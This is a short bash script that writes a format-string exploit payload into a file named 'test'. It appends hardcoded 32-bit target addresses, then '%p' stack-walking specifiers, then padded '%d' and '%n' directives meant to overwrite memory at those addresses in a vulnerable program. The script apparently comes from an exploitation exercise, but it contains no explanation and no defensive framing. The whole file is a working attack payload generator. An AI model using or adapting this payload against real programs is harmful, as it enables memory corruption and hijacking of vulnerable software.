#!/bin/bash

export FILE=test

rm -f $FILE
touch $FILE
chmod +w $FILE

/bin/echo -ne '\x38\x98\x04\x08' >> $FILE
/bin/echo -ne '\x38\x98\x04\x08' >> $FILE

/bin/echo -ne '\x3a\x98\x04\x08' >> $FILE
/bin/echo -ne '\x3a\x98\x04\x08' >> $FILE



TIMES=0
python -c "
import sys;
sys.stdout.write(\"B\" * $TIMES )
" >> $FILE

for i in {0..2}
do
	echo -n '%p' >> $FILE
done


echo -n '%33915d' >> $FILE
echo -n '%n' >> $FILE

echo -n '%33632d' >> $FILE
echo -n '%n' >> $FILE
echo '' >> $FILE
